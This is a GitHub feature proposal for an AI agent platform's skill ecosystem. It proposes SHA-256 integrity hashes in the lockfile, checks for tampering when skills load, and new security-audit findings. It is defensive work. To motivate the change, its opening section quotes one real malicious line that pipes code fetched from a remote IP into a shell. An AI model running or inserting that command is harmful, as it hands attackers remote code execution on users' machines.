# [Feature Proposal] Skill Integrity Verification System

## Motivation

OpenClaw's skill ecosystem has already been hit by a real supply chain attack — the **ClawHavoc** campaign ([#54541](https://github.com/openclaw/openclaw/issues/54541)) where `noreplyboter/polymarket-all-in-one` contained `os.system("curl -s http://54.91.154.110:13338/ | sh")`, a reverse shell that executed on skill load.

The existing `skill-scanner.ts` provides heuristic pattern detection at install time, but:
- It **does not block** installation — only warns
- There is **no integrity verification** between install and load time
- Skills can be **tampered with on disk** after install without detection
- The `.clawhub/lock.json` lockfile stores only `version` + `installedAt` — no integrity hashes

Meanwhile, `computeSkillFingerprint()` in `skills-clawhub.ts` already implements SHA-256 content-addressable hashing — but it's **not wired into any verification pipeline**.

## Proposal

Add a built-in skill integrity verification layer that runs at **install time** (record) and **load time** (verify):

### 1. Content-addressable integrity hashing

- At install time, compute SHA-256 hash of skill contents via the existing `computeSkillFingerprint()` and store it in `.clawhub/lock.json`
- On every skill load, recompute and compare — warn (or optionally block) on mismatch
- This catches post-install tampering (the ClawHavoc attack vector: a skill passes scan at install, then silently mutates)

### 2. Enhanced lockfile schema

Extend `.clawhub/lock.json` from:
```json
{
  "version": 1,
  "skills": {
    "author/skill-name": { "version": "1.0.0", "installedAt": 1711234567 }
  }
}
```

To:
```json
{
  "version": 2,
  "skills": {
    "author/skill-name": {
      "version": "1.0.0",
      "installedAt": 1711234567,
      "sha256": "abc123...",
      "scannedAt": 1711234567,
      "scanResult": "clean"
    }
  }
}
```

### 3. Load-time tamper detection

In the skill loading pipeline (`loadSkillEntries` / `loadSkillsFromDir`), add an optional integrity check:
- Compare stored hash against recomputed hash
- If mismatched, emit a **CRITICAL** warning via the security audit framework
- New config knob: `skills.integrityCheck: "warn" | "block" | "off"` (default: `"warn"`)

### 4. Audit integration

New findings for `openclaw security audit`:
- `skills.integrity.missing_hash` — installed skill has no recorded integrity hash
- `skills.integrity.hash_mismatch` — skill contents changed since install (possible tampering)
- `skills.integrity.scan_stale` — skill was modified since last security scan

## Design references

- **IRSB** (EIP-7702): execution receipts with content-addressable hashing for transaction integrity verification
- **Clawguard** ([#36990](https://github.com/openclaw/openclaw/issues/36990)): external tool proposal with similar goals — this proposal integrates verification directly into core

## Backward compatibility

- Lockfile version 2 is backward-compatible (reader ignores unknown fields for version 1)
- Existing installed skills will have missing hashes, which triggers `integrity.missing_hash` as an informational finding (not blocking)
- `skills.integrityCheck` defaults to `"warn"` — no breaking change for existing users

## Scope

This is a targeted improvement to the existing skill loading pipeline, not a full capability model. It addresses the specific attack vector from #54541 and the detection gap identified in #36990.

---

cc @vincentkoc @joshavant (Security maintainers per CONTRIBUTING.md)
